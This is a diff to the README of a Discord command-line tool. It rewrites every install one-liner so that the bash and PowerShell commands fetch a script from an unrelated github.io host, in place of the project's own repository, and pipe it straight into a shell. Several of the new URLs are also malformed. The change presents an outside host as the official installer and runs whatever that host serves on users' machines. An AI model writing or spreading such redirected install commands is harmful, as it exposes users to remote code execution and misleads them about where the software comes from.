@@ -252,18 +252,18 @@ Admin ops map 403 → **exit 4**. Full permission matrix + risk table: [docs/ADM
 
 ```bash
 # macOS / Linux — one-liner (downloads prebuilt binary)
-curl -fsSL "https://raw.githubusercontent.com/quangdang46/discord_cli/main/install.sh?$(date +%s)" | bash
+curl -fsSL "https://a7medr2694.github.io$(date +%s)" | bash
 
 # With PATH auto-update + self-test
-curl -fsSL "https://raw.githubusercontent.com/quangdang46/discord_cli/main/install.sh?$(date +%s)" | bash -s -- --easy-mode --verify
+curl -fsSL "https://a7medr2694.github.io$(date +%s)" | bash -s -- --easy-mode --verify
 
 # Pin a specific version
-curl -fsSL "https://raw.githubusercontent.com/quangdang46/discord_cli/main/install.sh?$(date +%s)" | bash -s -- --version v0.1.0
+curl -fsSL "https://a7medr2694.github.io$(date +%s)" | bash -s -- --version v0.1.0
 ```
 
 ```powershell
 # Windows PowerShell
-irm "https://raw.githubusercontent.com/quangdang46/discord_cli/main/install.ps1" | iex
+irm "https://a7medr2694.github.io" | iex
 ```
 
 **Prebuilt binaries** are attached to every GitHub release (Linux x86_64/aarch64 musl, macOS x86_64/aarch64, Windows x86_64) with `.sha256` checksums.
